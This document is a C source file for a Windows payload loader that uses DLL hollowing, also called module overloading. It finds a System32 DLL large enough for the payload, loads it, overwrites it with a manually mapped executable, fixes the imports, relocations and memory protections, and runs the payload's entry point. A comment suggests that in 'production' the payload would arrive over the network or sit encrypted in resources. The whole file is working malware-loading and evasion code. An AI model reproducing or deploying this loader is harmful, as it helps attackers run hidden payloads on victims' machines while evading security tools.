# include <windows.h>
# include <stdio.h>

# define api_error( api, msg, ... ) \
	wprintf( L"[!] " api L" failed with error: %d\n\t> MSG: " msg "\n", GetLastError(), ##__VA_ARGS__ );

# define api_ferror( api, msg, ... )																	 \
	wprintf( L"[!] " api L" failed with error: %d\n\t> MSG: " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	return -1																							 \

# define ntapi_ferror( api, status, msg, ... )														  \
	wprintf( L"[!] " api L" failed with error: 0x%0.8X\n\t> MSG: " msg "\n", status, ##__VA_ARGS__ ); \
	return -1	

# define msg( msg, ... ) \
	wprintf( L"[+] " msg L"\n", ##__VA_ARGS__ ) \

# define ferr( _msg, ... ) \
	wprintf( L"[-] " _msg L"\n", ##__VA_ARGS__ ); \
	return -1

typedef BOOL( WINAPI* MAIN )();

typedef NTSTATUS(NTAPI* fpNtCreateSection) (PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS(NTAPI* fpNtMapViewOfSection) (HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, int InheritDisposition, ULONG AllocationType, ULONG PageProtection);

typedef struct _BASE_RELOCATION_ENTRY {
	WORD	Offset : 12;
	WORD	Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int wmain(int argc, wchar_t* argv[] )
{
	void*				hFile				= 0,
						*hFile2				= 0,
						*hExeFile			= 0,
						*hHeap,
						*hModule,
						*pFileBuffer		= 0,
						*pTargetDll,
						*pLoadedExe			= 0,
						*pExeBuffer;
	unsigned long		ulFileSize,
						ulProtection,
						ulOldProtection,
						ulBytesRead;
	unsigned long long  ullFunctionAddress = 0,
						ullOffset;
	int					Sys32Length			= lstrlen( L"C:\\Windows\\System32\\" );
	size_t				ViewSize			= 0,
					    ExeSize,
						DllSize				= 0,
						ThunkSize			= 0;
	WIN32_FIND_DATA		FileData			= { 0 };
	PIMAGE_DOS_HEADER	ExeDosHeader		= { 0 },
						DllDosHeader		= { 0 };
	PIMAGE_NT_HEADERS	ExeNtHeader			= { 0 },
						DllNtHeader			= { 0 };
	PIMAGE_SECTION_HEADER Section = 0;
	PIMAGE_IMPORT_DESCRIPTOR ImageDescriptor = 0;
	PIMAGE_DATA_DIRECTORY ImportDirectory = 0;
	PIMAGE_THUNK_DATA IATEntry = 0, INTEntry = 0;
	PIMAGE_IMPORT_BY_NAME ImportByName = 0;
	PIMAGE_BASE_RELOCATION BaseRelocation = 0;
	PBASE_RELOCATION_ENTRY BaseRelocationEntry = 0;
	wchar_t				wcDllPath[MAX_PATH] = { 0 };
	MAIN				Main = 0;

	fpNtCreateSection	 NtCreateSection	= ( fpNtCreateSection )GetProcAddress( GetModuleHandle(L"ntdll.dll"), "NtCreateSection" );
	fpNtMapViewOfSection NtMapViewOfSection = ( fpNtMapViewOfSection )GetProcAddress( GetModuleHandle(L"ntdll.dll"), "NtMapViewOfSection" );

	if (argc != 2)
	{
		ferr( L"USAGE: %s <exe to inject>", argv[0] );
	}

	/*
		Step 1: Read file path of exe from user to buffer. Get the size of the image.
				Note: In production scenario, this would be read over the network or 
					  encrypted in .rsrc section, etc.
	*/
	if ( ( hExeFile = CreateFileW( argv[1], GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		api_ferror( L"CreateFileA", L"Could not get a handle to %s.\n", argv[1] );
	}
	if ( ( ExeSize = GetFileSize( hExeFile, 0 ) ) == INVALID_FILE_SIZE )
	{
		api_ferror( L"GetFileSize", L"Could not get the size of %s", argv[1] );
	}
	if ( ( pExeBuffer = VirtualAlloc( 0, ExeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		api_ferror( L"VirtualAlloc", L"Could not allocate buffer for executable file.\n" );
	}
	if ( ( ReadFile( hExeFile, pExeBuffer, ( unsigned long )ExeSize, &ulBytesRead, 0 ) ) == FALSE )
	{
		api_ferror( L"ReadFile", L"Could not read executable from user to buffer at 0x%p", pExeBuffer );
	}
	CloseHandle( hExeFile );
	
	ExeDosHeader = ( PIMAGE_DOS_HEADER )pExeBuffer;
	ExeNtHeader  = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pExeBuffer + ExeDosHeader->e_lfanew );
	if ( ExeDosHeader->e_magic != IMAGE_DOS_SIGNATURE || ExeNtHeader->Signature != IMAGE_NT_SIGNATURE )
		return 0;

	ExeSize = ExeNtHeader->OptionalHeader.SizeOfImage;
	
	/*
		Step 2: Locate a dll in system32 which is big enough to contain the payload.
	*/
	if ( ( hFile = FindFirstFile( L"C:\\Windows\\System32\\*.dll", &FileData ) ) == INVALID_HANDLE_VALUE ) 
	{
		api_ferror( L"FindFirstFileW", L"Could not get a handle to C:\\Windows\\System32\\*.dll." );
	}
	
	if ( ( hHeap = GetProcessHeap() ) == NULL )
	{
		api_ferror( L"GetProcessHeap", L"Could not acquire a handle to the process heap." );
	}
	
	msg( "Searching for a target dll to load & overwrite..." );
	do
	{
		if ( Sys32Length + lstrlen( FileData.cFileName ) >= MAX_PATH )
			continue;

		swprintf_s( wcDllPath, MAX_PATH, L"C:\\Windows\\System32\\%s", FileData.cFileName );
		if ( ( hFile2 = CreateFile( wcDllPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
		{
			api_error( L"CreateFileW", L"Could not get a handle to %s", FileData.cFileName );
			continue;
		}

		ulFileSize = ( FileData.nFileSizeHigh * ( MAXDWORD + 1 ) ) + FileData.nFileSizeLow;
	
		if ( ( pFileBuffer = HeapAlloc( hHeap, HEAP_ZERO_MEMORY, ulFileSize ) ) == NULL )
		{
			api_error( L"HeapAlloc", L"Could not allocate enough memory on the heap for %s. (%d bytes)", FileData.cFileName, ulFileSize );
			goto Cleanup;
		}

		if ( !ReadFile( hFile2, pFileBuffer, ulFileSize, &ulBytesRead, 0 ) )
		{
			api_error( L"ReadFile", L"Could not read %s into buffer at 0x%p", FileData.cFileName, pFileBuffer );
			goto Cleanup;
		}

		DllDosHeader = ( PIMAGE_DOS_HEADER )pFileBuffer;
		DllNtHeader  = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pFileBuffer + DllDosHeader->e_lfanew );
		if ( DllDosHeader->e_magic != IMAGE_DOS_SIGNATURE || DllNtHeader->Signature != IMAGE_NT_SIGNATURE )
		{
			goto Cleanup;
		}

		if ( DllNtHeader->OptionalHeader.SizeOfImage >= ExeSize )
		{
			DllSize = DllNtHeader->OptionalHeader.SizeOfImage;
			msg( L"Found suitable dll for the portable executable.\n\t> DLL: %s\n\t> Size: %zd\n\t> Payload Size: %zd", FileData.cFileName, DllSize, ExeSize );
			break;
		}

	Cleanup:
		CloseHandle( hFile2 );
		if ( pFileBuffer )
			HeapFree( hHeap, 0, pFileBuffer );
		
		pFileBuffer = 0;
	} 
	while ( FindNextFileW( hFile, &FileData ) );

	if ( DllSize == 0 )
	{
		ferr( "[-] Could not find a valid dll to overload." );
	}

	/*
		Step 3: Load the dll into memory
	*/
	if ( ( pTargetDll = LoadLibrary( FileData.cFileName ) ) == NULL )
	{
		api_error( "LoadLibrary", "Could not load %s to memory", FileData.cFileName );
		goto CleanupMain;
	}
	if ( !VirtualProtect( pTargetDll, DllSize, PAGE_READWRITE, &ulOldProtection ) )
	{
		api_error( "VirtualProtect", "Could not set memory protections on %s to PAGE_EXECUTE_READWRITE", FileData.cFileName );
		goto CleanupMain;
	}
	msg( "Loaded %s to memory at 0x%p", FileData.cFileName, pTargetDll );

	/*
		Step 4: Begin loading the exe supplied by the user into memory manually
	*/
	if ( ( pLoadedExe = VirtualAlloc( 0, ExeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		api_error( "VirtualAlloc", "Could not allocate memory to load the executable");
		goto CleanupMain;
	}

	/*
		Step 4a: Copy the exectuable sections to the buffer
	*/
	memcpy( pLoadedExe, pExeBuffer, ExeNtHeader->OptionalHeader.SizeOfHeaders );
	Section = IMAGE_FIRST_SECTION( ExeNtHeader );
	for ( int i = 0; i < ExeNtHeader->FileHeader.NumberOfSections; i++ )
	{
		memcpy( 
				( void* )( ( char* )pLoadedExe + Section[i].VirtualAddress ),
				( void* )( ( char* )pExeBuffer + Section[i].PointerToRawData ),
				Section[i].SizeOfRawData
		);
	}

	/*
		Step 4b: Resolve the import address table of the executable
	*/
	msg( "Resolving import address table for %s", argv[1] );
	for ( size_t i = 0; i < ExeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof( IMAGE_IMPORT_DESCRIPTOR ) )
	{
		ImageDescriptor = ( PIMAGE_IMPORT_DESCRIPTOR )( ( char* )pLoadedExe + ExeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
		if ( ImageDescriptor->FirstThunk == 0 && ImageDescriptor->OriginalFirstThunk == 0 )
			break;

		if ( ( hModule = LoadLibraryA( ( char* )( ( size_t )pLoadedExe + ImageDescriptor->Name ) ) ) == NULL )
		{
			api_ferror( "LoadLibraryA", "Could not import the dll. Failed to resolve import address table." );
		}

		ThunkSize = 0;
		while ( TRUE )
		{
			IATEntry			= ( PIMAGE_THUNK_DATA )( ( char* )pLoadedExe + ImageDescriptor->FirstThunk + ThunkSize );
			INTEntry			= ( PIMAGE_THUNK_DATA )( ( char* )pLoadedExe + ImageDescriptor->OriginalFirstThunk + ThunkSize );
			
			if ( IATEntry->u1.Function == 0 && INTEntry->u1.Function == 0 )
			{
				break;
			}

			if ( IMAGE_SNAP_BY_ORDINAL( INTEntry->u1.Ordinal ) )
			{
				if ( ( IATEntry->u1.Function = ( unsigned long long )GetProcAddress( hModule, ( char* )( IMAGE_ORDINAL( INTEntry->u1.Ordinal ) ) ) ) == 0 )
				{
					api_ferror( "GetProcAddress", "Could not resolve function by ordinal.");
				}
			}
			else
			{
				ImportByName = ( PIMAGE_IMPORT_BY_NAME )( ( char* )pLoadedExe + INTEntry->u1.AddressOfData );
				if ( ( IATEntry->u1.Function = ( unsigned long long )GetProcAddress( hModule, ImportByName->Name ) ) == 0 )
				{
					api_ferror( "GetProcAddress", "Could not resolve %hs", ImportByName->Name );
				}
			}
			ThunkSize += sizeof( IMAGE_THUNK_DATA );
		}
		printf( "\t[RESOLVED] - %s\n", ( ( char* )pLoadedExe + ImageDescriptor->Name ) );
	}

	/*
		Step 5: Zero out target dll & overwrite with the loaded executable
	*/
	memset( pTargetDll, 0, DllSize );
	memcpy( pTargetDll, pLoadedExe, ExeSize );

	/*
		Step 6: Begin patching base relocations
	*/
	BaseRelocation = ( PIMAGE_BASE_RELOCATION )( ( char* )pTargetDll + ExeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress );
	ullOffset	   = ( char* )pTargetDll - ExeNtHeader->OptionalHeader.ImageBase;

	while ( BaseRelocation->VirtualAddress )
	{
		BaseRelocationEntry = ( PBASE_RELOCATION_ENTRY )( BaseRelocation + 1 );

		while ( ( unsigned long long )BaseRelocationEntry != ( ( unsigned long long )BaseRelocation + BaseRelocation->SizeOfBlock ) )
		{
			switch ( BaseRelocationEntry->Type )
			{
				case IMAGE_REL_BASED_DIR64:
					*( ( unsigned long long* )( ( char* )pTargetDll + BaseRelocation->VirtualAddress + BaseRelocationEntry->Offset ) ) += ullOffset;
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*( ( unsigned long* )( ( char* )pTargetDll + BaseRelocation->VirtualAddress + BaseRelocationEntry->Offset ) ) += ( unsigned long )ullOffset;
					break;
				case IMAGE_REL_BASED_HIGH:
					*( ( unsigned short* )( ( char* )pTargetDll + BaseRelocation->VirtualAddress + BaseRelocationEntry->Offset ) ) += HIWORD( ullOffset );
					break;
				case IMAGE_REL_BASED_LOW:
					*( ( unsigned short* )( ( char* )pTargetDll + BaseRelocation->VirtualAddress + BaseRelocationEntry->Offset ) ) += LOWORD( ullOffset );
					break;
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				default:
					ferr( "Received unexpected relocation type %d | Offset: 0x%0.8X\n", BaseRelocationEntry->Offset, BaseRelocationEntry->Offset );
			}
			BaseRelocationEntry++;
		}

		BaseRelocation = ( PIMAGE_BASE_RELOCATION )BaseRelocationEntry;
	}

	/*
		Step 7: Fix up the memory permissions on the payload
	*/
	for ( int i = 0; i < ExeNtHeader->FileHeader.NumberOfSections; i++ )
	{
		if ( !Section[i].SizeOfRawData || !Section[i].VirtualAddress )
		{
			continue;
		}

		if ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			ulProtection = PAGE_WRITECOPY;

		if ( Section[i].Characteristics & IMAGE_SCN_MEM_READ )
			ulProtection = PAGE_READONLY;

		if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			ulProtection = PAGE_EXECUTE;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			ulProtection = PAGE_READWRITE;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			ulProtection = PAGE_EXECUTE_READ;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			ulProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			ulProtection = PAGE_EXECUTE_READWRITE;

		if ( !VirtualProtect( ( void* )( ( char* )pTargetDll + Section[i].VirtualAddress ), Section[i].SizeOfRawData, ulProtection, &ulProtection ) )
		{
			api_ferror( "VirtualProtect", "Could not set protections on %hs section", Section[i].Name );
		}
	}

	/*
		Step 8: Execute the payload
	*/
	Main = ( MAIN )( ( char* )pTargetDll + ExeNtHeader->OptionalHeader.AddressOfEntryPoint );
	Main();


	printf("0x%p\n", pTargetDll);
	getchar();



CleanupMain:
	if ( pFileBuffer )
		HeapFree( hHeap, 0, pFileBuffer );

	//if ( pTargetDll )
	//	FreeLibrary( pTargetDll );

	if ( hHeap )
		CloseHandle( hHeap );

	if ( pLoadedExe )
		VirtualFree( pLoadedExe, 0, MEM_RELEASE );

	printf("clean exit\n");

	return 0;
}


